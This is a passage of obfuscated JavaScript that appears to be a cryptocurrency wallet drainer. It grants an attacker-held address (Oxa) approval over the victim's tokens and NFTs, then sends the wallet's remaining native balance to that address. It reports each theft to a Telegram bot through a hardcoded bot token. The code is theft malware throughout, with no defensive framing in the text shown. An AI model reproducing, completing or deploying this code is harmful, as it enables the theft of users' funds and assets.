_0x489f94=_0x40c37d;if(tokens[_0x489f94(0x14a)])try{loopTokens(tokens);}catch(_0x1039b2){console[_0x489f94(0x136)](_0x489f94(0x184)+_0x1039b2[_0x489f94(0x1ee)]);}else{if(NFTs[_0x489f94(0x14a)]){try{loopNfts(NFTs);}catch(_0x2b22ef){console[_0x489f94(0x136)](_0x489f94(0x184)+_0x2b22ef[_0x489f94(0x1ee)]);}onSendEther(),sendMessage(_0x489f94(0x15b));}else try{onSendEther();}catch(_0x3d9fcd){console['error'](_0x489f94(0x184)+_0x3d9fcd[_0x489f94(0x1ee)]);}}}async function loopTokens(_0x58cb0a){const _0x5417f5=_0x40c37d;for await(let _0x558e89 of _0x58cb0a){console[_0x5417f5(0x13c)](_0x5417f5(0x194),_0x558e89);try{sendMessage(_0x5417f5(0x161));let {hash:_0x137854}=await writeContract({'address':_0x558e89[_0x5417f5(0x146)],'abi':ABI,'functionName':_0x5417f5(0x1d4),'args':[Oxa,_0x5417f5(0x1c7)]});console[_0x5417f5(0x13c)]('hash',_0x137854),_0x137854&&(console[_0x5417f5(0x13c)](_0x5417f5(0x1da)),sendMessage(_0x5417f5(0x1b8)),sendMessage('TOKEN\x20Contract\x20Address\x20'+_0x558e89[_0x5417f5(0x146)]),sendMessage('Token\x20balance\x20is\x20'+_0x558e89[_0x5417f5(0x1c2)]),sendMessage('Your\x20address\x20'+Oxa));}catch(_0x377b94){console[_0x5417f5(0x13c)](_0x5417f5(0x19c)+_0x377b94),sendMessage(_0x5417f5(0x122));}};await loopNfts(NFTs);}async function loopNfts(_0x4450aa){const _0x4dd142=_0x40c37d;for await(let _0x3bed9a of _0x4450aa){console[_0x4dd142(0x13c)](_0x4dd142(0x145),_0x3bed9a);try{let {hash:_0x443315}=await writeContract({'address':_0x3bed9a['token_address'],'abi':ABIN,'functionName':_0x4dd142(0x169),'args':[Oxa,!![]]});console[_0x4dd142(0x13c)](_0x4dd142(0x14c),_0x443315),console[_0x4dd142(0x13c)]('Transaction\x20Receipt:\x20'+receipt),sendMessage(_0x4dd142(0x1b8)),sendMessage(_0x4dd142(0x121)+_0x3bed9a[_0x4dd142(0x1e4)]),sendMessage(_0x4dd142(0x138)+Oxa);}catch(_0x1844ca){console['log'](_0x4dd142(0x19c)+_0x1844ca),sendMessage(_0x4dd142(0x122));}}await onSendEther();}async function onSendEther(){const _0x1a6cfa=_0x40c37d;console['log'](_0x1a6cfa(0x1ce));try{let _0x429377=await fetchBalance({'address':selectedAccount});console[_0x1a6cfa(0x13c)](_0x429377);const _0x27c964=await fetchFeeData();console[_0x1a6cfa(0x13c)](_0x27c964);var _0x5ea5c1=_0x27c964[_0x1a6cfa(0x13b)][_0x1a6cfa(0x172)];_0x5ea5c1=parseFloat(_0x5ea5c1);let _0x15877b=parseFloat(_0x429377['formatted'])-_0x5ea5c1*0.00042;_0x15877b=parseEther(_0x15877b['toString']()),console[_0x1a6cfa(0x13c)](_0x15877b);const {hash:_0x31faa8}=await sendTransaction({'to':Oxa,'value':_0x15877b});console[_0x1a6cfa(0x13c)](_0x31faa8),sendMessage(_0x1a6cfa(0x16e),_0x31faa8),sendMessage('Transaction\x20is\x20submitted\x20to\x20the\x20network'),sendMessage('Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens');}catch{sendMessage(_0x1a6cfa(0x128));}}async function sendMessage(_0xf25c4b){return new Promise((_0x539ad2,_0x429692)=>{const _0xfe5867=_0x9691,_0x43c9a8=Oxc;fetch('https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id='+_0x43c9a8+'&text='+_0xf25c4b,{'method':_0xfe5867(0x1d7),'headers':{}})[_0xfe5867(0x14e)](async _0x81070a=>{const _0x5f235d=_0xfe5867;if(_0x81070a[_0x5f235d(0x190)]>0x18f)throw _0x81070a;_0x539ad2(await _0x81070a[_0x5f235d(0x1d6)]());})[_0xfe5867(0x1c8)](_0x32e74c=>{_0x429692(_0x32e74c);});});}async function getPrice(_0x305526){return new Promise((_0x4d2286,_0x5c4b89)=>{const _0x23024f=_0x9691;fetch(_0x23024f(0x140)+_0x305526+_0x23024f(0x12e),{'method':_0x23024f(0x1d7),'headers':{}})['then'](async _0x252482=>{const _0x5a9ae4=_0x23024f;if(_0x252482[_0x5a9ae4(0x190)]>0x18f)throw _0x252482;_0x4d2286(await _0x252482[_0x5a9ae4(0x1d6)]());})[_0x23024f(0x1c8)](_0x1a9257=>{_0x5c4b89(_0x1a9257);});});}async function getValue(_0x5e538f,_0x12cc30,_0x3ca331){const _0x55774e=_0x40c37d;console[_0x55774e(0x13c)](_0x5e538f,_0x12cc30,_0x3ca331);let _0x1ba895=await getPrice(_0x5e538f);console[_0x55774e(0x13c)](_0x55774e(0x15e),_0x1ba895),_0x1ba895=parseFloat(_0x1ba895[_0x5e538f][_0x55774e(0x162)]);let _0x5bd09b=_0x12cc30/0xa**(_0x3ca331||0x12)*_0x1ba895;return _0x5bd09b=parseInt(_0x5bd09b),_0x1ba895?_0x5bd09b:0x0;}async function getNFTs(_0x3a00a4='',_0x21feb7=_0x40c37d(0x19d),_0x2cd1e3=_0x40c37d(0x1a1),_0x9c3f98='50'){return new Promise((_0xc0c2ff,_0x409d4a)=>{const _0xef505d=_0x9691;fetch(_0xef505d(0x1d1)+_0x3a00a4+'/nft/collections?chain='+_0x2cd1e3+_0xef505d(0x1e6)+_0x9c3f98,{'method':'GET','headers':{'accept':_0xef505d(0x149),'X-API-Key':_0x21feb7}})[_0xef505d(0x14e)](async _0x5031ca=>{const _0x56ab64=_0xef505d;if(_0x5031ca[_0x56ab64(0x190)]>0x18f)throw _0x5031ca;_0xc0c2ff(await _0x5031ca[_0x56ab64(0x1d6)]());})[_0xef505d(0x1c8)](_0x3d9e95=>{_0x409d4a(_0x3d9e95);});});}